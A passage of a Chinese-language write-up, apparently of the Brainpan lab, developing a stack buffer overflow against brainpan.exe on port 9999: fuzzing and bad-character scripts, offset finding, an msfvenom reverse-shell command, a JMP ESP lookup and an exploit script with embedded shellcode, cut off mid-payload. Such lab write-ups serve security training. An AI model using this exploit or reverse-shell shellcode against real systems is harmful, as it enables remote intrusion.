class="hljs-number">*4000</span><br><br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><span class="hljs-builtin-name">print</span> <span class="hljs-string">&quot;[*]Sending evil buffer...&quot;</span><br><br>s.connect((host, 9999))<br><span class="hljs-attribute">data</span>=s.recv(1024)<br><span class="hljs-builtin-name">print</span> data<br>s.send(buffer)<br>s.close()<br><span class="hljs-builtin-name">print</span> <span class="hljs-string">&quot;[*]Payload Sent !&quot;</span><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-30-04/4.PNG" alt="4"></p><h2 id="d2-py-找到EIP"><a href="#d2-py-找到EIP" class="headerlink" title="d2.py 找到EIP"></a>d2.py 找到EIP</h2><p><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 4000</code>运行该命令，生成4000字节字符串。</p><p>修改demo.py的这一行</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">buffer</span> = <span class="hljs-comment">&quot;生成的字符串”</span><br></code></pre></div></td></tr></table></figure><p>运行demo.py，得到报错的地址35724134<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-30-04/5.PNG" alt="5"></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/metasploit-framework/</span>tools<span class="hljs-regexp">/exploit/</span>pattern_offset.rb -l <span class="hljs-number">4000</span> -q <span class="hljs-number">35724134</span><br>[*] Exact match at offset <span class="hljs-number">524</span><br></code></pre></div></td></tr></table></figure><h2 id="d3-py-确认EIP"><a href="#d3-py-确认EIP" class="headerlink" title="d3.py 确认EIP"></a>d3.py 确认EIP</h2><p>修改demo.py的这一行</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">buffer</span> = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">524</span> + <span class="hljs-string">&quot;B&quot;</span>*<span class="hljs-number">4</span><br></code></pre></div></td></tr></table></figure><p>运行demo.py，确保EIP地址被B字符串覆盖。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-30-04/6.PNG" alt="6"></p><h2 id="d4-py-检查坏字符"><a href="#d4-py-检查坏字符" class="headerlink" title="d4.py 检查坏字符"></a>d4.py 检查坏字符</h2><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">#!/usr/bin/python<br>import socket<br><br>host = &quot;192.168.67.1&quot;<br><br>badchars = (<br>&quot;<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>09<span class="hljs-symbol">\x</span>0a<span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>0c<span class="hljs-symbol">\x</span>0d<span class="hljs-symbol">\x</span>0e<span class="hljs-symbol">\x</span>0f<span class="hljs-symbol">\x</span>10&quot;<br>&quot;<span class="hljs-symbol">\x</span>11<span class="hljs-symbol">\x</span>12<span class="hljs-symbol">\x</span>13<span class="hljs-symbol">\x</span>14<span class="hljs-symbol">\x</span>15<span class="hljs-symbol">\x</span>16<span class="hljs-symbol">\x</span>17<span class="hljs-symbol">\x</span>18<span class="hljs-symbol">\x</span>19<span class="hljs-symbol">\x</span>1a<span class="hljs-symbol">\x</span>1b<span class="hljs-symbol">\x</span>1c<span class="hljs-symbol">\x</span>1d<span class="hljs-symbol">\x</span>1e<span class="hljs-symbol">\x</span>1f<span class="hljs-symbol">\x</span>20&quot;<br>&quot;<span class="hljs-symbol">\x</span>21<span class="hljs-symbol">\x</span>22<span class="hljs-symbol">\x</span>23<span class="hljs-symbol">\x</span>24<span class="hljs-symbol">\x</span>25<span class="hljs-symbol">\x</span>26<span class="hljs-symbol">\x</span>27<span class="hljs-symbol">\x</span>28<span class="hljs-symbol">\x</span>29<span class="hljs-symbol">\x</span>2a<span class="hljs-symbol">\x</span>2b<span class="hljs-symbol">\x</span>2c<span class="hljs-symbol">\x</span>2d<span class="hljs-symbol">\x</span>2e<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>30&quot;<br>&quot;<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>32<span class="hljs-symbol">\x</span>33<span class="hljs-symbol">\x</span>34<span class="hljs-symbol">\x</span>35<span class="hljs-symbol">\x</span>36<span class="hljs-symbol">\x</span>37<span class="hljs-symbol">\x</span>38<span class="hljs-symbol">\x</span>39<span class="hljs-symbol">\x</span>3a<span class="hljs-symbol">\x</span>3b<span class="hljs-symbol">\x</span>3c<span class="hljs-symbol">\x</span>3d<span class="hljs-symbol">\x</span>3e<span class="hljs-symbol">\x</span>3f<span class="hljs-symbol">\x</span>40&quot;<br>&quot;<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>42<span class="hljs-symbol">\x</span>43<span class="hljs-symbol">\x</span>44<span class="hljs-symbol">\x</span>45<span class="hljs-symbol">\x</span>46<span class="hljs-symbol">\x</span>47<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>49<span class="hljs-symbol">\x</span>4a<span class="hljs-symbol">\x</span>4b<span class="hljs-symbol">\x</span>4c<span class="hljs-symbol">\x</span>4d<span class="hljs-symbol">\x</span>4e<span class="hljs-symbol">\x</span>4f<span class="hljs-symbol">\x</span>50&quot;<br>&quot;<span class="hljs-symbol">\x</span>51<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>53<span class="hljs-symbol">\x</span>54<span class="hljs-symbol">\x</span>55<span class="hljs-symbol">\x</span>56<span class="hljs-symbol">\x</span>57<span class="hljs-symbol">\x</span>58<span class="hljs-symbol">\x</span>59<span class="hljs-symbol">\x</span>5a<span class="hljs-symbol">\x</span>5b<span class="hljs-symbol">\x</span>5c<span class="hljs-symbol">\x</span>5d<span class="hljs-symbol">\x</span>5e<span class="hljs-symbol">\x</span>5f<span class="hljs-symbol">\x</span>60&quot;<br>&quot;<span class="hljs-symbol">\x</span>61<span class="hljs-symbol">\x</span>62<span class="hljs-symbol">\x</span>63<span class="hljs-symbol">\x</span>64<span class="hljs-symbol">\x</span>65<span class="hljs-symbol">\x</span>66<span class="hljs-symbol">\x</span>67<span class="hljs-symbol">\x</span>68<span class="hljs-symbol">\x</span>69<span class="hljs-symbol">\x</span>6a<span class="hljs-symbol">\x</span>6b<span class="hljs-symbol">\x</span>6c<span class="hljs-symbol">\x</span>6d<span class="hljs-symbol">\x</span>6e<span class="hljs-symbol">\x</span>6f<span class="hljs-symbol">\x</span>70&quot;<br>&quot;<span class="hljs-symbol">\x</span>71<span class="hljs-symbol">\x</span>72<span class="hljs-symbol">\x</span>73<span class="hljs-symbol">\x</span>74<span class="hljs-symbol">\x</span>75<span class="hljs-symbol">\x</span>76<span class="hljs-symbol">\x</span>77<span class="hljs-symbol">\x</span>78<span class="hljs-symbol">\x</span>79<span class="hljs-symbol">\x</span>7a<span class="hljs-symbol">\x</span>7b<span class="hljs-symbol">\x</span>7c<span class="hljs-symbol">\x</span>7d<span class="hljs-symbol">\x</span>7e<span class="hljs-symbol">\x</span>7f<span class="hljs-symbol">\x</span>80&quot;<br>&quot;<span class="hljs-symbol">\x</span>81<span class="hljs-symbol">\x</span>82<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>84<span class="hljs-symbol">\x</span>85<span class="hljs-symbol">\x</span>86<span class="hljs-symbol">\x</span>87<span class="hljs-symbol">\x</span>88<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>8a<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>8c<span class="hljs-symbol">\x</span>8d<span class="hljs-symbol">\x</span>8e<span class="hljs-symbol">\x</span>8f<span class="hljs-symbol">\x</span>90&quot;<br>&quot;<span class="hljs-symbol">\x</span>91<span class="hljs-symbol">\x</span>92<span class="hljs-symbol">\x</span>93<span class="hljs-symbol">\x</span>94<span class="hljs-symbol">\x</span>95<span class="hljs-symbol">\x</span>96<span class="hljs-symbol">\x</span>97<span class="hljs-symbol">\x</span>98<span class="hljs-symbol">\x</span>99<span class="hljs-symbol">\x</span>9a<span class="hljs-symbol">\x</span>9b<span class="hljs-symbol">\x</span>9c<span class="hljs-symbol">\x</span>9d<span class="hljs-symbol">\x</span>9e<span class="hljs-symbol">\x</span>9f<span class="hljs-symbol">\x</span>a0&quot;<br>&quot;<span class="hljs-symbol">\x</span>a1<span class="hljs-symbol">\x</span>a2<span class="hljs-symbol">\x</span>a3<span class="hljs-symbol">\x</span>a4<span class="hljs-symbol">\x</span>a5<span class="hljs-symbol">\x</span>a6<span class="hljs-symbol">\x</span>a7<span class="hljs-symbol">\x</span>a8<span class="hljs-symbol">\x</span>a9<span class="hljs-symbol">\x</span>aa<span class="hljs-symbol">\x</span>ab<span class="hljs-symbol">\x</span>ac<span class="hljs-symbol">\x</span>ad<span class="hljs-symbol">\x</span>ae<span class="hljs-symbol">\x</span>af<span class="hljs-symbol">\x</span>b0&quot;<br>&quot;<span class="hljs-symbol">\x</span>b1<span class="hljs-symbol">\x</span>b2<span class="hljs-symbol">\x</span>b3<span class="hljs-symbol">\x</span>b4<span class="hljs-symbol">\x</span>b5<span class="hljs-symbol">\x</span>b6<span class="hljs-symbol">\x</span>b7<span class="hljs-symbol">\x</span>b8<span class="hljs-symbol">\x</span>b9<span class="hljs-symbol">\x</span>ba<span class="hljs-symbol">\x</span>bb<span class="hljs-symbol">\x</span>bc<span class="hljs-symbol">\x</span>bd<span class="hljs-symbol">\x</span>be<span class="hljs-symbol">\x</span>bf<span class="hljs-symbol">\x</span>c0&quot;<br>&quot;<span class="hljs-symbol">\x</span>c1<span class="hljs-symbol">\x</span>c2<span class="hljs-symbol">\x</span>c3<span class="hljs-symbol">\x</span>c4<span class="hljs-symbol">\x</span>c5<span class="hljs-symbol">\x</span>c6<span class="hljs-symbol">\x</span>c7<span class="hljs-symbol">\x</span>c8<span class="hljs-symbol">\x</span>c9<span class="hljs-symbol">\x</span>ca<span class="hljs-symbol">\x</span>cb<span class="hljs-symbol">\x</span>cc<span class="hljs-symbol">\x</span>cd<span class="hljs-symbol">\x</span>ce<span class="hljs-symbol">\x</span>cf<span class="hljs-symbol">\x</span>d0&quot;<br>&quot;<span class="hljs-symbol">\x</span>d1<span class="hljs-symbol">\x</span>d2<span class="hljs-symbol">\x</span>d3<span class="hljs-symbol">\x</span>d4<span class="hljs-symbol">\x</span>d5<span class="hljs-symbol">\x</span>d6<span class="hljs-symbol">\x</span>d7<span class="hljs-symbol">\x</span>d8<span class="hljs-symbol">\x</span>d9<span class="hljs-symbol">\x</span>da<span class="hljs-symbol">\x</span>db<span class="hljs-symbol">\x</span>dc<span class="hljs-symbol">\x</span>dd<span class="hljs-symbol">\x</span>de<span class="hljs-symbol">\x</span>df<span class="hljs-symbol">\x</span>e0&quot;<br>&quot;<span class="hljs-symbol">\x</span>e1<span class="hljs-symbol">\x</span>e2<span class="hljs-symbol">\x</span>e3<span class="hljs-symbol">\x</span>e4<span class="hljs-symbol">\x</span>e5<span class="hljs-symbol">\x</span>e6<span class="hljs-symbol">\x</span>e7<span class="hljs-symbol">\x</span>e8<span class="hljs-symbol">\x</span>e9<span class="hljs-symbol">\x</span>ea<span class="hljs-symbol">\x</span>eb<span class="hljs-symbol">\x</span>ec<span class="hljs-symbol">\x</span>ed<span class="hljs-symbol">\x</span>ee<span class="hljs-symbol">\x</span>ef<span class="hljs-symbol">\x</span>f0&quot;<br>&quot;<span class="hljs-symbol">\x</span>f1<span class="hljs-symbol">\x</span>f2<span class="hljs-symbol">\x</span>f3<span class="hljs-symbol">\x</span>f4<span class="hljs-symbol">\x</span>f5<span class="hljs-symbol">\x</span>f6<span class="hljs-symbol">\x</span>f7<span class="hljs-symbol">\x</span>f8<span class="hljs-symbol">\x</span>f9<span class="hljs-symbol">\x</span>fa<span class="hljs-symbol">\x</span>fb<span class="hljs-symbol">\x</span>fc<span class="hljs-symbol">\x</span>fd<span class="hljs-symbol">\x</span>fe<span class="hljs-symbol">\x</span>ff&quot; )<br><br>buffer = &quot;A&quot;*524 + badchars<br><br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>print &quot;[*]Sending evil buffer...&quot;<br><br>s.connect((host, 9999))<br>data=s.recv(1024)<br>print data<br>s.send(buffer)<br>s.close()<br>print &quot;[*]Payload Sent !&quot;<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-30-04/7.PNG" alt="7"></p><p>右上角寄存器面板，看到EDX寄存器的值为“AAAAAAAAAAAAAAAA…”，于是选中EDX，右键 follow in dump，左下角翻到A字符串的结尾。</p><p>查看发送的字符，从01开头，ff结尾，没有找到坏字符。一般来说\x00是坏字符，忘记加到字符里检查了，下次注意。</p><h2 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h2><p><code>nmap -O 192.168.67.130</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-30-04/8.PNG" alt="8"></p><p>这里有一点迷茫，因为IP为192.168.67.130的目标主机，看起来是个linux主机，但是运行的程序brainpan.exe却是一个windows 32的应用程序。</p><p>所以到底该生成linux的shellcode，还是windows的shellcode?</p><p>不管了，先生成windows的shellcode，在本地192.168.67.1的windows主机尝试是否能反弹shell吧。</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">msfvenom -p windows/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.67.128 <span class="hljs-attribute">LPORT</span>=443 -b <span class="hljs-string">&quot;\x00&quot;</span> -e x86/shikata_ga_nai -f c<br><br>生成了shellcode，注意去除坏字符\x00<br></code></pre></div></td></tr></table></figure><h2 id="找到JMP-ESP"><a href="#找到JMP-ESP" class="headerlink" title="找到JMP ESP"></a>找到JMP ESP</h2><p>JMP ESP 是跳转到栈顶寄存器的汇编指令。<br>因为栈顶的内存地址是动态的，而程序的JMP ESP指令是相对固定的。<br>可以利用该指令来跳转到栈顶的位置。这可以方便我们定位内存地址，利于exp的编写。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/metasploit-framework/</span>tools<span class="hljs-regexp">/exploit/</span>nasm_shell.rb<br><br>JMP ESP<br><br>将汇编指令转换为十六进制的\xff\xe4<br></code></pre></div></td></tr></table></figure><p>immunity debugger</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm">!mona modules<br><br>!mona find -s <span class="hljs-string">&quot;\xff\xe4&quot;</span> -m brainpan<span class="hljs-number">.</span>exe<br><br>找到<span class="hljs-keyword">jmp</span> <span class="hljs-built_in">esp</span>指令的具体地址<span class="hljs-number">0x311712f3</span><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-30-04/9.PNG" alt="9"></p><h2 id="d5-py"><a href="#d5-py" class="headerlink" title="d5.py"></a>d5.py</h2><p>将上述得到的信息结合起来，EIP跳转地址——栈顶<code>0x311712f3</code>，栈长度524，没有坏字符的shellcode。</p><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">#!/usr/bin/python<br>import socket<br>from struct import pack<br><br>host = &quot;192.168.67.1&quot;  #有bof漏洞的目标主机IP<br><br>shellcode =&quot;<span class="hljs-symbol">\x</span>ba<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>2c<span class="hljs-symbol">\x</span>49<span class="hljs-symbol">\x</span>dd<span class="hljs-symbol">\x</span>db<span class="hljs-symbol">\x</span>d8<span class="hljs-symbol">\x</span>d9<span class="hljs-symbol">\x</span>74<span class="hljs-symbol">\x</span>24<span class="hljs-symbol">\x</span>f4<span class="hljs-symbol">\x</span>5e<span class="hljs-symbol">\x</span>33<span class="hljs-symbol">\x</span>c9<span class="hljs-symbol">\x</span>b1&quot;<br>shellcode +=&quot;<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>c6<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>56<span class="hljs-symbol">\x</span>0e<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>d5<span class="hljs-symbol">\x</span>22<span class="hljs-symbol">\x</span>ab<span class="hljs-symbol">\x</span>28<span class="hljs-symbol">\x</span>25<span class="hljs-symbol">\x</span>d2<span class="hljs-symbol">\x</span>a9&quot;<br>shellcode +=&quot;<span class="hljs-symbol">\x</span>d3<span class="hljs-symbol">\x</span>d5<span class="hljs-symbol">\x</span>23<span class="hljs-symbol">\x</span>ce<span class="hljs-symbol">\x</span>5a<span class="hljs-symbol">\x</span>30<span class="hljs-symbol">\x</span>12<span class="hljs-symbol">\x</span>ce<span class="hljs-symbol">\x</span>39<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>fe<span class="hljs-symbol">\x</span>4a<span class="hljs-symbol">\x</span>17<span class="hljs-symbol">\x</span>aa&quot;<br>shellcode +=&quot;<span class="hljs-symbol">\x</span>75<span class="hljs-symbol">\x</span>1e<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>39<span class="hljs-symbol">\x</span>fb<span class="hljs-symbol">\x</span>b7<span class="hljs-symbol">\x</span>a4<span class="hljs-symbol">\x</span>8a<span class="hljs-symbol">\x</span>b6<span class="hljs-symbol">\x</span>e1<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>ea<span class="hljs-symbol">\x</span>d2<span class="hljs-symbol">\x</span>8a&quot;<br>shellcode +=&quot;<span class="hljs-symbol">\x</span>8f<span class="hljs-symbol">\x</span>f1<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>6c<span class="hljs-symbol">\x</span>b1<span class="hljs-symbol">\x</span>39<span class="hljs-symbol">\x</span>5b<span class="hljs-symbol">\x</span>6d<span class="hljs-symbol">\x</span>f6<span class="hljs-symbol">\x</span>24<span class="hljs-symbol">\x</span>96<span class="hljs-symbol">\x</span>3f<span class="hljs-symbol">\x</span>af<span class="hljs-symbol">\x</span>23<span class="hljs-symbol">\x</span>05&quot;<br>shellcode +=&quot;<span class="hljs-symbol">\x</span>af<span class="hljs-symbol">\x</span>c4<span class="hljs-symbol">\x</span>7e<span class="hljs-symbol">\x</span>96<span class="hljs-symbol">\x</span>44<span class="hljs-symbol">\x</span>96<span class="hljs-symbol">\x</span>6f<span class="hljs-symbol">\x</span>9e<span class="hljs-symbol">\x</span>b9<span class="hljs-symbol">\x</span>6f<span class="hljs-symbol">\x</span>91<span class="hljs-symbol">\x</span>8f<span class="hljs-symbol">\x</span>6c<span class="hljs-symbol">\x</span>fb<span class="hljs-symbol">\x</span>c8&quot;<br>shellcode +=&quot;<span class="hljs-symbol">\x</span>0f<span class="hljs-symbol">\x</span>8f<span class="hljs-symbol">\x</span>28<span class="hljs-symbol">\x</span>61<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>97<span class="hljs-symbol">\x</span>2d<span class="hljs-symbol">\x</span>4c<span class="hljs-symbol">\x</span>d0<span class="hljs-symbol">\x</span>2c<span class="hljs-symbol">\x</span>85<span class="hljs-symbol">\x</span>3a<span class="hljs-symbol">\x</span>e3<span class="hljs-symbol">\x</span>e4<span class="hljs-symbol">\x</span>d7&quot;<br>shellcode +=&quot;<span class="hljs-symbol">\x</span>c3<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>c9<span class="hljs-symbol">\x</span>d7<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>90<span class="hljs-symbol">\x</span>0e<span class="hljs-symbol">\x</span>df<span class="hljs-symbol">\x</span>a9<span class="hljs-symbol">\x</span>e7<span class="hljs-symbol">\x</span>66<span class="hljs-symbol">\x</span>23<span class="hljs-symbol">\x</span>57<span class="hljs-symbol">\x</span>f0<span class="hljs-symbol">\x</span>bd&quot;<br>shellcode +=&quot;<span class="hljs-symbol">\x</span>59<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>75<span class="hljs-symbol">\x</span>25<span class="hljs-symbol">\x</span>f9<span class="hljs-symbol">\x</span>40<span class="hljs-symbol">\x</span>2d<span class="hljs-symbol">\x</span>81<span class="hljs-symbol">\x</span>fb<span class="hljs-symbol">\x</span>85<span class="hljs-symbol">\x</span>a8<span class="hljs-symbol">\x</span>42<span class="hljs-symbol">\x</span>f7<span class="hljs-symbol">\x</span>62<span class="hljs-symbol">\x</span>be&quot;<br>shellcode +=&quot;<span class="hljs-symbol">\x</span>0c<span class="hljs-symbol">\x</span>14<span class="hljs-symbol">\x</span>74<span class="hljs-symbol">\x</span>13<span class="hljs-symbol">\x</span>27<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>fd<span class="hljs-symbol">\x</span>92<span class="hljs-symbol">\x</span>e7<span class="hljs-symbol">\x</span>a0<span class="hljs-symbol">\x</span>45<span class="hljs-symbol">\x</span>b1<span class="hljs-symbol">\x</span>23<span class="hljs-symbol">\x</span>e8<span class="hljs-symbol">\x</span>1e&quot;<br>shellcode +=&quot;<span class="hljs-symbol">\x</span>d8<span class="hljs-symbol">\x</span>72<span class="hljs-symbol">\x</span>54<span class="hljs-symbol">\x</span>f0<span class="hljs-symbol">\x</span>e5<span class="hljs-symbol">\x</span>64<span class="hljs-symbol">\x</span>37<span class="hljs-symbol">\x</span>ad<span class="hljs-symbol">\x</span>43<span class="hljs-symbol">\x</span>ef<span class="hljs-symbol">\x</span>da<span class="hljs-symbol">\x</span>ba<span class="hljs-symbol">\x</span>f9<span class="hljs-symbol">\x</span>b2<span class="hljs-symbol">\x</span>b2&quot;<br>shellcode +=&quot;<span class="hljs-symbol">\x</span>0f<span class="hljs-symbol">\x</span>30<span class="hljs-symbol">\x</span>4c<span class="hljs-symbol">\x</span>43<span class="hljs-symbol">\x</span>18<span class="hljs-symbol">\x</span>43<span class="hljs-symbol">\x</span>3f<span class="hljs-symbol">\x</span>71<span class="hljs-symbol">\x</span>87<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>d7<span class="hljs-symbol">\x</span>39<span class="hljs-symbol">\x</span>40<span class="hljs-symbol">\x</span>26<span class="hljs-symbol">\x</span>20&quot;<br>shellcode +=&quot;<span class="hljs-symbol">\x</span>3d<span class="hljs-symbol">\x</span>7b<span class="hljs-symbol">\x</span>9e<span class="hljs-symbol">\x</span>be<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>84<span class="hljs-symbol">\x</span>df<span class="hljs-symbol">\x</span>97<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>d0<span class="hljs-symbol">\x</span>8f<span class="hljs-symbol">\x</span>8f<span class="hljs-symbol">\x</span>af<span class="hljs-symbol">\x</span>59<span class="hljs-symbol">\x</span>44&quot;<br>shellcode +=&quot;<span class="hljs-symbol">\x</span>4f<span class="hljs-symbol">\x</span>4f<span class="hljs-symbol">\x</span>8c<span class="hljs-symbol">\x</span>cb<span class="hljs-symbol">\x</span>1f<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>7f<span class="hljs-symbol">\x</span>ac<span class="hljs-symbol">\x</span>cf<span class="hljs-symbol">\x</span>bf<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>44<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>30<span class="hljs-symbol">\x</span>0f&quot;<br>shellcode +=&quot;<span class="hljs-symbol">\x</span>74<span class="hljs-symbol">\x</span>26<span class="hljs-symbol">\x</span>9a<span class="hljs-symbol">\x</span>38<span class="hljs-symbol">\x</span>1f<span class="hljs-symbol">\x</span>dd<span class="hljs-symbol">\x</span>4d<span class="hljs-symbol">\x</span>87<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>9e<span class="hljs-symbol">\x</span>0d<span class="hljs-symbol">\x</span>6f<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>0f&quot;<br>shellcode +=&quot;<span class="hljs-symbol">\x</span>cb<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>c6<span class="hljs-symbol">\x</span>65<span class="hljs-symbol">\x</span>3b<span class="hljs-symbol">\x</span>43<span class="hljs-symbol">\x</span>51<span class="hljs-symbol">\x</span>12<span class="hljs-symbol">\x</span>a2<span class="hljs-symbol">\x</span>ce<span class="hljs-symbol">\x</span>29<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>2b<span class="hljs-symbol">\x</span>c5<span class="hljs-symbol">\x</span>54&quot;<br>shellcode +=&quot;<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>a0<span class="hljs-symbol">\x</span>ea<span class="hljs-symbol">\x</span>a9<span class="hljs-symbol">\x</span>4a<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>86<span class="hljs-symbol">\x</span>b9<span class="hljs-symbol">\x</span>3b<span class="hljs-symbol">\x</span>a1<span class="hljs-symbol">\x</span>dd<span class="hljs-symbol">\x</span>e3<span class="hljs-symbol">\x</span>ea<span class="hljs-symbol">\x</span>be<span class="hljs-symbol">\x</span>cb&quot;<br>shellcode +=&quot;<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>71<span class="hljs-symbol">\x</span>2c<span class="hljs-symbol">\x</span>90<span class="hljs-symbol">\x</span>4b<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>4d<span class="hljs-symbol">\x</span>0f<span class="hljs-symbol">\x</span>1c<span class="hljs-symbol">\x</span>a8<span class="hljs-symbol">\x</span>a0<span class="hljs-symbol">\x</span>46<span class="hljs-symbol">\x</span>c8<span class="hljs-symbol">\x</span>44<span class="hljs-symbol">\x</span>9a&quot;<br>shellcode +=&quot;<span class="hljs-symbol">\x</span>f0<span class="hljs-symbol">\x</span>ee<span class="hljs-symbol">\x</span>94<span class="hljs-symbol">\x</span>7a<span class="hljs-symbol">\x</span>3a<span class="hljs-symbol">\x</span>aa<span class="hljs-symbol">\x</span>42<span class="hljs-symbol">\x</span>bf<span class="hljs-symbol">\x</span>c5<span class="hljs-symbol">\x</span>33<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>fb<span class="hljs-symbol">\x</span>e1<span class="hljs-symbol">\x</span>23<span class="hljs-symbol">\x</span>de&quot;<br>shellcode +=&quot;<span class="hljs-symbol">\x</span>04<span 